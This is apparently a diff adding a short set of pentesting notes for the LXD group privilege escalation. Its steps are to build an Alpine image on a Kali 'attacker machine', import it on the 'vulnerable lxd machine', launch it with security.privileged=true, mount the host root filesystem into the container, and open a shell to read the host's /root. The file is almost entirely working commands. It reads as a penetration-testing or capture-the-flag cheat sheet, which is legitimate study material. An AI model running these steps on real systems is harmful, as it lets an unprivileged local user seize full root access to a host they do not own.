@@ -1,0 +1,26 @@
+#on kali attacker machine, run as root
+# build a simple alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+./build-alpine -a i686
+
+#on vulnerable lxd machine
+# import the image
+lxc image import ./alpine.tar.gz --alias myimage
+
+#check import by listing image list doing lxc image list
+
+# run the image
+lxc init myimage mycontainer -c security.privileged=true
+
+# mount the /root into the image
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+
+# interact with the container
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+id
+
+#Once inside the container, navigate to /mnt/root to see all resources from the host machine.
+cd mnt/root/root
+ls
+
